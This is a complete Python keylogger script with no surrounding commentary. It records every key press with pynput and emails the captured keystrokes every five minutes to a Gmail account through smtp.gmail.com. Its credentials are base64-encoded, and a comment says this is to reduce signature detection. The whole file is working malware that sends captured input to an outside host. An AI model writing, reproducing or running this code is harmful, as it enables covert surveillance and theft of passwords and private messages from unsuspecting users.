from pynput import keyboard
import threading
import base64
import smtplib
from email.mime.text import MIMEText
import datetime

# --- Config (base64-encoded for minimal signature exposure) ---
encoded_email = b'dGVzdGVyMkBnbWFpbC5jb20='       # your_email@gmail.com
encoded_pass  = b'YXBwX3Bhc3N3b3JkX2hlcmU='       # app_password_here

# --- Runtime decoding ---
EMAIL = base64.b64decode(encoded_email).decode()
PASS  = base64.b64decode(encoded_pass).decode()
SEND_INTERVAL = 300  # send every 5 mins

# --- Global log buffer ---
key_buffer = ""
buffer_lock = threading.Lock()

# --- Send logs via Gmail ---
def send_email():
    global key_buffer
    with buffer_lock:
        if key_buffer:
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            message = MIMEText(key_buffer)
            message['From'] = EMAIL
            message['To'] = EMAIL
            message['Subject'] = f'Keylog - {timestamp}'
            try:
                with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
                    server.login(EMAIL, PASS)
                    server.send_message(message)
                print(f"[+] Sent log: {timestamp}")
            except Exception as e:
                print(f"[!] Email failed: {e}")
            key_buffer = ""
    # Reschedule
    threading.Timer(SEND_INTERVAL, send_email).start()

# --- Capture key presses ---
def capture_key(key):
    global key_buffer
    try:
        if hasattr(key, 'char') and key.char:
            key_buffer += key.char
        else:
            key_buffer += f"[{key.name}]"
    except:
        pass

# --- Launch everything ---
send_email()
with keyboard.Listener(on_press=capture_key) as listener:
    listener.join()
